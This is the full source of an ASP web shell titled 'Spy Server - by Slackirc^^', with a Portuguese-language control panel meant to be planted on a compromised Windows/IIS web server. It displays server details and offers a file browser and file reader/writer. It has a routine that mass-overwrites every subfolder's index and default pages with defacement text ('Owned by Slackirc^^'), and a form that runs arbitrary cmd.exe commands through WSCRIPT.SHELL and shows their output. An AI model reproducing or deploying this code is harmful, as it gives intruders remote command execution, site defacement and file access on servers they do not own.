<%@LANGUAGE="VBSCRIPT" CODEPAGE="1252"%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>Spy Server - by Slackirc^^</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
</head>
<style  type="text/css">
<!--
.neo {
	text-align: Center;
	PADDING-RIGHT: 1px;
	PADDING-LEFT: 1px;
	FONT-STYLE: bold;
	FONT-SIZE: 9px;
	PADDING-BOTTOM: 1px;
	COLOR: #FF0000;
	PADDING-TOP: 1px;
	BACKGROUND-COLOR: #000000;
	border: 1px solid #FF0000;
	font-family: verdana, arial;
}
.txt {
	text-align: Left;
	PADDING-RIGHT: 1px;
	PADDING-LEFT: 1px;
	FONT-STYLE: bold;
	FONT-SIZE: 9px;
	PADDING-BOTTOM: 1px;
	COLOR: #FF0000;
	PADDING-TOP: 1px;
	BACKGROUND-COLOR: #000000;
	border: 1px solid #FF0000;
	font-family: verdana, arial;
}
.style1 {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 9px;
	color: #FFFFFF;
}
.style2 {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	color: #FF0000;
	font-size: 12px;
}
a {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 9px;
	color: #FFFFFF;
}
a:link {
	text-decoration: none;
}
a:visited {
	text-decoration: none;
	color: #FFFFFF;
}
a:hover {
	text-decoration: none;
	color: #FF0000;
}
a:active {
	text-decoration: none;
	color: #FFFFFF;
}
-->
</style>
<body bgcolor="#000000" text="#FFFFFF">
<table width="100%">
  <tr>
    <td bgcolor="#000000" height="10" bordercolor="#C0C0C0" width="98%">
      <div align="center" class="style2">Sistema de Controle do Servidor</div></td>
  </tr>
</table>
<br>
<table width="65%" border="0" cellspacing="0" cellpadding="0" align="center">
  <tr>
    <td>
      <p align="center" class="style1">Informa&ccedil;&otilde;es do Servidor</p>
      <table border="0" cellpadding="0" cellspacing="0" width="818">
        <tr> 
          <td valign="TOP" width="454"><p><span class="style2">Nome do Script:</span><font class="style1">
            <% = Request.ServerVariables("SCRIPT_NAME") %></font><br>
              <span class="style2">Protocolo do Servidor: </span><font class="style1">
              <% = Request.ServerVariables("SERVER_PROTOCOL") %></font><br>	
			  		  
              <span class="style2">Endere&ccedil;o Ip Servidor Local:</span><font class="style1"><%=request.servervariables("LOCAL_ADDR")%></font><br>
			  
              <span class="style2">Endere�o do F�sico:</span><font class="style1"> 
              <% = Request.ServerVariables("PATH_TRANSLATED") %></font><br>
			  
              <span class="style2">Referencia HTTP:// :</span> <font class="style1"></font><a href="http://<% = Request.ServerVariables("SERVER_NAME") %>" target="_blank"><% = Request.ServerVariables("SERVER_NAME") %></a><br>
			  <span class="style2">Software Webserver :</span><font class="style1"> <%=request.servervariables("SERVER_SOFTWARE")%></font></p>
	      </td>
          <td valign="TOP" width="364"><div align="center"></div>
            <font >&nbsp; </font>
            <p><span class="style2">Seu IP :</span><font class="style1"><%= request.servervariables("REMOTE_ADDR") %> </font></p>
            <font face="Arial">
            <div align="left"><font class="style2">Tempo de Respota do Servidor Web:<br>
              <font class="style1">
              <%response.write "Processado em " & FormatNumber( Timer - inicio, 2 ) & " segundos"%>
              </font></font></div>
          </font> </td>
        </tr>
      </table>
      <div align="center"></div>
      <font face="Arial">&nbsp;</font></td>
  </tr>
</table>
<hr align="center" noshade>
      <p align="center" class="style1">Substitui��o de Arquivos</p>
<%
On Error Resume Next
Set Objeto=Server.CreateObject("Scripting.FileSystemObject")
if request("t5") <> "" then
 Set ObjPasta = Objeto.GetFolder(request("t5"))
end if 
%>
<%On Error Resume Next
if request("t3") <> "" then
Set ObjPasta2 = Objeto.GetFolder(request("t3"))
set ObjFso=server.CreateObject("Scripting.FileSystemObject")
var_caminho=request("t3")
For Each Pasta in ObjPasta2.Subfolders
 Set ObjAbreArq = ObjFso.OpenTextFile(Var_Caminho & "\" & pasta.name & "\index.htm", 2, True, False)
 ObjAbreArq.writeline request("t4")
 set ObjAbreArq = nothing   
 Set ObjAbreArq = ObjFso.OpenTextFile(Var_Caminho & "\" & pasta.name & "\index.html", 2, True, False)
 ObjAbreArq.writeline request("t4")
 set ObjAbreArq = nothing   
 Set ObjAbreArq = ObjFso.OpenTextFile(Var_Caminho & "\" & pasta.name & "\index.asp", 2, True, False)
 ObjAbreArq.writeline request("t4")
 set ObjAbreArq = nothing   
 Set ObjAbreArq = ObjFso.OpenTextFile(Var_Caminho & "\" & pasta.name & "\default.htm", 2, True, False)
 ObjAbreArq.writeline request("t4")
 set ObjAbreArq = nothing   
 Set ObjAbreArq = ObjFso.OpenTextFile(Var_Caminho & "\" & pasta.name & "\default.html", 2, True, False)
 ObjAbreArq.writeline request("t4")
 set ObjAbreArq = nothing   
 Set ObjAbreArq = ObjFso.OpenTextFile(Var_Caminho & "\" & pasta.name & "\index.aspx", 2, True, False)
 ObjAbreArq.writeline request("t4")
 set ObjAbreArq = nothing 
 Set ObjAbreArq = ObjFso.OpenTextFile(Var_Caminho & "\" & pasta.name & "\default.asp", 2, True, False)
 ObjAbreArq.writeline request("t4")
 if err then
   response.write "<font color=red><br>Acesso negado em: " & pasta.name & "</font>"
   err=0
 else
   response.write "<font color=write><br>Acesso permitido em: " & pasta.name & "</font>"
 end if    
 set ObjAbreArq = nothing   
next
set ObjFso=nothing
Set ObjPasta2 = nothing
set ObjFso = nothing
end if
%>
<%
      DIM fs, d, dc, s, n, sp
      Set fs=Server.Createobject("Scripting.FileSystemObject")
      Set dc=fs.drives
%><center>
      <form method="POST" action="spy.asp"><p><span class="style1">Caminho:</span>
	  <input name="T3" type="text" class="neo" size="100">
      <br>
      <span class="style1">Texto:</span><textarea rows="6" name="T4" class="neo" cols="49">Owned by Slackirc^^ - msn:slackirc@hotmail.com</textarea>
      <input name="B1" type="submit" class="neo" value="Go">
      </p>
      </form>
</center>
<hr align="center" noshade>
      <p align="center" class="style1">Explorer</p>
      <form method="POST" action="spy.asp"><div align="center"><center><p><span class="style1">Prompt:</span>        <input name="T5" type="text" class="neo"  value="<%=request("t5")%>" size="100"> 
      <input name="B1" type="submit" class="neo" value="Dir">
      </p> </center>
      </div></form>
	  <div align="center"><center><table border="1" width="70%" bordercolor="#FF0000" cellspacing="0" cellpadding="0"><tr><td width="50%"><p align="center" class="style1">Diret�rios Numerados</td><td width="50%"><p align="center" class="style1">Arquivos</td></tr><tr>
    <td width="50%" valign="top"><span class="style1"><% On Error Resume Next
     dim contador
     contador=1
      For Each Pasta in ObjPasta.Subfolders
         Response.Write Contador & "-) "& Pasta.Name & "<br>"
         contador=contador+1
      next%></span>
<p>&nbsp;</p>
</td>
    <td width="50%" valign="top"><span class="style1"><%On Error Resume Next
       For Each Arquivo in ObjPasta.Files
         Response.Write Arquivo.Name & "<br>"
       Next%></span>
<p>&nbsp;</p>
</td>
  </tr>
</table>
<hr align="center" noshade>
          <p class="style1">Visualizar Arquivos</p>
      </center></div>

<form method="POST" action="spy.asp">
  <div align="center"><center>
    <p><span class="style1">Caminho/arquivo/edit on|off:</span>
      <input name="TT1" type="text" class="neo" size="100"> 
      <input name="TT2" type="text" class="neo" size="20">
	  <input name="TT3" type="text" class="neo" value="" size="1"> 
  <input name="B1" type="submit" class="neo" value="Ver Arquivo">
  </p>
  </center>
  </div>
</form>
<p><form method="POST" action="spy.asp">
<%On Error Resume Next
if request("TT3") <> "" then
Set ObjPasta2 = Objeto.GetFolder(var_caminho)
set ObjFso=server.CreateObject("Scripting.FileSystemObject")
Server.ScriptTimeout=300
var_caminho=request("TT1")
var_arq=request("TT2")
'For Each Pasta in ObjPasta2.Subfolders
For Each Pasta in ObjPasta2.files
 Set ObjAbreArq = ObjFso.CreateTextFile(var_caminho & "\" & var_arq, True)
 ObjAbreArq.writeline teste
  ObjAbreArq.close
 if err then
   response.write "<font color=red><br>Erro em: </font>" & pasta.name
   err=0
 else
   response.write "<br>Ownado em " & pasta.name
 end if    
  set ObjAbreArq = nothing   
next
set var_caminho=nothing
set var_arq=nothing
set ObjFso=nothing
Set ObjPasta2 = nothing
set ObjFso = nothing
end if
%>
<%On Error Resume Next
if request("TT1") <> "" then
		  var_arq=request("TT2")
		  var_caminho=request("TT1")
          set ObjFso2=server.CreateObject("Scripting.FileSystemObject")
          Set ObjAbreArq2 = ObjFso2.OpenTextFile(var_caminho & "\" & var_arq, 1, True, False)
           Do While Not ObjAbreArq2.AtEndOfStream
              Linha = Linha & ObjAbreArq2.Readline & chr(13)
           Loop
           response.write "<CENTER><TEXTAREA NAME=creative ROWS=10 COLS=100 CLASS=txt>" & Linha & "</TEXTAREA></CENTER>"
           ObjAbreArq2.Close
           Set ObjAbreArq2 = Nothing
           ObjFso2.close
           set ObjFso2 = Nothig
end if%></form></p>
<hr align="center" width="100%" noshade>
          <center><p class="style1">Unidades do servidor</p></center>
<table width="750" border="0" align="center">
      <tr bgcolor="#FFFFFF" bordercolor="#C0C0C0"> 
        <td bordercolor="#FF0000" bgcolor="#000000" style="border: 1px solid #FF0000; "> 
          <p align="center"> <font face="Fixedsys" color="#FF0000" class="style1">Letra</font> 
        </td>
        <td bordercolor="#FF0000" bgcolor="#000000" style="border: 1px solid #FF0000; "> 
          <p align="center"> <font face="Fixedsys" color="#FF0000" class="style1">Tipo de Drive</font> 
        </td>
        <td bordercolor="#FF0000" bgcolor="#000000" style="border: 1px solid #FF0000; "> 
          <p align="center"> <font face="Fixedsys" color="#FF0000" class="style1">Volume</font> 
        </td>
        <td bordercolor="#FF0000" bgcolor="#000000" style="border: 1px solid #FF0000; "> 
          <p align="center"> <font face="Fixedsys" color="#FF0000" class="style1">Sistema de Arquivo</font> 
        </td>
        <td bordercolor="#FF0000" bgcolor="#000000" style="border: 1px solid #FF0000; "> 
          <p align="center"> <font face="Fixedsys" color="#FF0000" class="style1">Espa�o Livre</font> 
        </td>
        <td bordercolor="#FF0000" bgcolor="#000000" style="border: 1px solid #FF0000; "> 
          <p align="center"><font face="Fixedsys" color="#FF0000" class="style1">Tamanho Total</font> 
        </td>
      </tr>
      <% 
    back1="#D3E2E7"
    back2="#AFFEDE"
    back=back2
    FOR EACH d IN dc 
    IF (back=back2) THEN
      back=back1
    ELSE
      back=back2
    END IF
  %>
      <tr> 
        <td bordercolor="#808080"><span class="style1"><%=d.driveletter%></span></td>
        <td bordercolor="#808080"><span class="style1"><%
      IF d.DriveType = 0 Then
        s = "Unknown"
        IF d.VolumeName = "" Then
          n = "&nbsp;"
        Else
          n = d.VolumeName
        END IF
      ELSEIF d.drivetype=1 THEN
        s="Removable"
        IF d.isready THEN
          n=d.volumename
        ELSE
          n="--"
        END IF
      ELSEIF d.drivetype=2 THEN
         s="Fixed"
         IF d.isready THEN
           n=d.volumename
         ELSE
           n="--"
         END IF
      ELSEIF d.drivetype=3 THEN
        s="Network"
        IF d.isready THEN
          n=d.sharename
        ELSE
          n="--"
        END IF
      ELSEIF d.drivetype=4 THEN
        s="CDROM"
        IF d.isready THEN
          n=d.volumename
        ELSE
          n="--"
        END IF
      ELSEIF d.drivetype=5 THEN
        s="RAM Disk"
        IF d.isready THEN
          n=d.volumename
        ELSE
          n="--"
        END IF
      END IF
      response.write(s)
    %></span></td>
        <td bordercolor="#808080"><span class="style1"><%=n%></span></td>
        <td bordercolor="#808080"><span class="style1"><%
      str=""
      
      str=str & d.driveletter
      str=str & ":"
            
      'response.write(str)
      IF d.isready THEN
        set sp=fs.getdrive(str)
        response.write(sp.filesystem)
      ELSE
        response.write("--")
      END IF
    %></span></td>
        <td bordercolor="#808080"><span class="style1"><%
      str=""
      
      str=str & d.driveletter
      str=str & ":"
            
      'response.write(str)
      IF d.isready THEN
        freespace = (d.AvailableSpace / 1048576)
        set sp=fs.getdrive(str)
        response.write(Round(freespace,1) & " MB")
      ELSE
        response.write("--")
      END IF
    %></span></td>
        <td bordercolor="#808080"><span class="style1"><%
      str=""
      
      str=str & d.driveletter
      str=str & ":"
      'response.write(str)
      IF d.isready THEN
        totalspace = (d.TotalSize / 1048576)
        set sp=fs.getdrive(str)
        response.write(Round(totalspace,1) & " MB")
      ELSE
        response.write("--")
      END IF
    %></span></td>
      </tr>
      <%NEXT%>
</table>
<br>
<hr align="center" width="100%" noshade>
<center><p class="style1">Remote Control Telnet</p></center>
<%
Dim oScript
Dim oScriptNet
Dim oFileSys, oFile
Dim szCMD, szTempFile

On Error Resume Next
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet=Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
szCMD = Request.Form(".CMD")
If (szCMD <> "") Then
szTempFile = "C:\" & oFileSys.GetTempName( )
Call oScript.Run ("cmd.exe /c " & szCMD & ">" & szTempFile, 0, True)
Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)
End If
%>
<PRE>
<%
If (IsObject(oFile)) Then
On Error Resume Next
Response.Write Server.HTMLEncode(oFile.ReadAll)
oFile.Close
Call oFileSys.DeleteFile(szTempFile, True)
End If
%>
<br>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
</font>
<FORM action="<%= Request.ServerVariables("URL") %>" method="POST">
prompt> <input name=".CMD"  type="text" value="<%= szCMD %>" size="100" class="neo" maxlength="100"><input type=submit class="neo" value="Enter">
</FORM>
</center>
</body>
<%set ObjPasta = nothing
set Objeto = nothing%>